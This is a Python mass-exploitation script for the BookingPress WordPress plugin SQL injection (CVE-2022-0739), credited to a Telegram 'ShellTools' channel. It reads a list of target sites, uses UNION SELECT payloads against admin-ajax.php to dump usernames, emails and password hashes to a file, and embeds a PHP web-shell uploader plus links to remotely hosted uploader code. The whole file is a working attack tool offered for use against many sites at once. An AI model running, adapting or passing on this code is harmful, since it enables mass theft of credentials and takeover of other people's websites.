# CVE/Info:    2022-0739 BookingPresss SQL injection Vulnerability
# Coded BY JEX Coder  => T.me/ShellTools
import requests
import sys
from multiprocessing import Pool
from os import system, name
from re import findall
from random import randint
from json import loads


UploaderSource = 'https://raw.githubusercontent.com/Jexcoder/licenselist/main/up.php'
pasteBin = 'https://pastebin.com/raw/y46Km13C'
shell = '''<title>Vuln!! patch it Now!</title><?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }else { echo '<b>Not uploaded ! </b><br><br>'; }}?>'''
ag = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def clear():
    linux = 'clear'
    windows = 'cls'
    system([linux, windows][name == 'nt'])


def banner():
    sssss = r'''
                        Coded BY JEX Coder [VIP]
        ____              __   _             ____                          
       / __ )____  ____  / /__(_)___  ____ _/ __ \________  _______________
      / __  / __ \/ __ \/ //_/ / __ \/ __ `/ /_/ / ___/ _ \/ ___/ ___/ ___/
     / /_/ / /_/ / /_/ / ,< / / / / / /_/ / ____/ /  /  __(__  |__  |__  ) 
    /_____/\____/\____/_/|_/_/_/ /_/\__, /_/   /_/   \___/____/____/____/  
                                   /____/                                  
            BookingPresss SQL injection Vulnerability - CVE-2022-0739
                            T.me/ShellTools                                      

    '''
    print(sssss)

payload1 = ") UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -"
payload2 = ") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -"


def gen_payload(nonce, sqli_postfix, category_id=1):
    return {
            'action': 'bookingpress_front_get_category_services',
            '_wpnonce': nonce,
            'category_id':category_id,
            'total_service': f'{randint(100,10000)}{sqli_postfix}'
    }


def CVE_2022_0739(url):
    if str(url).startswith('http://'):
        url = url.replace('http://', '')
    elif str(url).startswith('https://'):
        url = url.replace('https://', '')
    sessions = requests.session()

    # STOP1 GET NONCE
    try:
        res = sessions.get('http://' + url, timeout=10, headers=ag).text
        if '_wpnonce=' in str(res):
            Nonce = findall('_wpnonce=(.*)&', res)[0].split('&')[0]
        elif '"nonce":"' in str(res):
            Nonce = findall('"nonce":"(.*)"', res)[0].split('"')[0]
        else:
            Nonce = 'NONE'
        if Nonce == 'NONE':
            print(' {} NOT EXPLOITED!'.format(url))
        else:
            print(' {} EXPLOITED> !~~~'.format(url))
            vuln_url = 'http://' + url + '/wp-admin/admin-ajax.php'
            payload = gen_payload(Nonce, payload1)
            r = sessions.post(vuln_url, data=payload, headers=ag)
            try:
                resu = list(loads(r.text)[0].values())
                cnt = int(resu[7])
                for i in range(cnt):
                    try:
                        user_payload = gen_payload(Nonce, payload2.format(off=i))
                        u_data = list(loads(sessions.post(vuln_url, user_payload).text)[0].values())
                        print(f"[+]Username     : {u_data[0]}")
                        print(f"[+]MailAddress  : {u_data[1]}")
                        print(f"[+]Password_hash: {u_data[2]}")
                        open('Injected.txt', 'a').write('{},{},{},{}\n'.format(url, u_data[0], u_data[1], u_data[2]))
                    except:
                        pass

            except:
                print(' {} NOT vulnerable!'.format(url))
    except:
        print(' {} NOT Requested!'.format(url))



if __name__ == '__main__':
    try:
        clear()
        banner()
        sites = open(sys.argv[1], 'r').read().splitlines()
        p = Pool(35)
        p.map(CVE_2022_0739, sites)
    except:
        clear()
        banner()
        print('     usage: python {} sites.txt'.format(sys.argv[0]))
        sys.exit()